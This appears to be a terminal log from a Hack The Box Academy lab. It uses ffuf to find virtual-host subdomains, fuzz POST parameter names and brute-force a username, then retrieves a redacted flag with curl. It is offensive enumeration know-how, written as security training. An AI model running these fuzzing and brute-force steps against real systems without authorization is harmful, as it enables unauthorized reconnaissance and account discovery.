### Test
```
------------------- Mapping Sub-Domains



root@cloud1:/opt/repos/SecLists/Discovery/DNS# ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:42785/ -H "Host: FUZZ.academy.htb"|head

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://academy.htb:42785/
 :: Wordlist         : FUZZ: /opt/repos/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.academy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

cpanel                  [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 16ms]
localhost               [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 16ms]
pop                     [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 17ms]
ftp                     [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 16ms]
ns1                     [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 16ms]
whm                     [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 17ms]
blog                    [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 18ms]
webdisk                 [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 18ms]
webmail                 [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 18ms]
smtp                    [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 18ms]
:: Progress: [49/4989] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::root@cloud1:/opt/repos/SecLists/Discovery/DNS# ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:42785/ -H "Host: FUZZ.academy.htb" -fs 985

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://academy.htb:42785/
 :: Wordlist         : FUZZ: /opt/repos/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.academy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 985
________________________________________________

archive                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 16ms]
test                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2475ms]
faculty                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 16ms]
:: Progress: [4989/4989] :: Job [1/1] :: 357 req/sec :: Duration: [0:00:05] :: Errors: 0 ::

Adding these to /etc/hosts

root@cloud1:/opt/repos/SecLists/Discovery/DNS# for x in {archive,test,faculty}; do echo <IP> $x >> /etc/hosts; done

cat /etc/hosts
94.237.63.83 academy.htb
94.237.63.83 archive.academy.htb
94.237.63.83 faculty.academy.htb
94.237.63.83 test.academy.htb


------------------- Exploiting Parameters

ffuf -w burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:42785/courses/linux-security.php7 -X POST -d "FUZZ=key" -H "Content-Type: application/x-www-form-urlencoded"
 
root@cloud1:/opt/repos/SecLists/Usernames# ffuf -w ../Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:42785/courses/linux-security.php7 -X POST -d "FUZZ=key" -H "Content-Type: application/x-www-form-urlencoded" -fs 774

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://faculty.academy.htb:42785/courses/linux-security.php7
 :: Wordlist         : FUZZ: /opt/repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : FUZZ=key
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 774
________________________________________________

user                    [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 16ms]
username                [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 16ms]
:: Progress: [6453/6453] :: Job [1/1] :: 2247 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
 
 cd ..
 cd Usernames/
 
 ffuf -w xato-net-10-million-usernames.txt:FUZZ -u http://faculty.academy.htb:42785/courses/linux-security.php7 -X POST -d "username=FUZZ" -H "Content-Type: application/x-www-form-urlencoded"
 
</html>root@cloud1:/opt/repos/SecLists/Userffuf -w xato-net-10-million-usernames.txt:FUZZ -u http://faculty.academy.htb:42785/courses/linux-security.php7 -X POST -d "username=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fs 781

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://faculty.academy.htb:42785/courses/linux-security.php7
 :: Wordlist         : FUZZ: /opt/repos/SecLists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 781
________________________________________________

harry                   [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 16ms]


root@cloud1:/opt/repos/SecLists/Usernames# curl http://faculty.academy.htb:42785/courses/linux-security.php7 -X POST -d "username=harry" -H "Content-Type: application/x-www-form-urlencoded"
<div class='center'><p>HTB{XXXXXXXX}/p></div>
<html>
<!DOCTYPE html>

<head>

 
 FLAG OBTAINED
 ```